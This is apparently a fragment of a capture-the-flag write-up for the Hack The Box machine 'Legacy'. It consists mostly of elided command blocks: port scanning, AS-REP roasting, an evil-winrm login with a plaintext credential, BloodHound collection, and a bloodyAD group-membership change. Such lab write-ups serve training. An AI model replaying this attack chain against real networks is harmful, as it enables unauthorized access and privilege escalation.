...
layout: page
title: "HTB: Legacy"
subtitle: "hackthebox ctf htb-legacy nmap windows easy active-directory netexec evil-winrm bloodhound hashcat..."
...
hackthebox ctf htb-legacy hackthebox ctf htb-legacy nmap windows easy active-directory netexec evil-winrm bloodhound hashcat
...
```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.10.10.4
Starting Nmap
PORT      STATE SERVICE
53/tcp    open  domain
...
```bash
oxdf@hacky$ netexec smb 10.10.10.4 -u guest -p ''
SMB    10.10.10.4  445  DC01   [-] guest: STATUS_ACCOUNT_DISABLED
```
...
```bash
oxdf@hacky$ GetNPUsers.py -dc-ip 10.10.10.4 -no-pass -usersfile users.txt domain/
...
```bash
oxdf@hacky$ evil-winrm -i 10.10.10.4 -u web_svc -p password123
...
```bash
oxdf@hacky$ netexec ldap 10.10.10.4 -u web_svc -p password123 --bloodhound -c all
```
...
```bash
oxdf@hacky$ bloodyAD -u web_svc -p password123 --host 10.10.10.4 add groupMember IT_Support web_svc
```
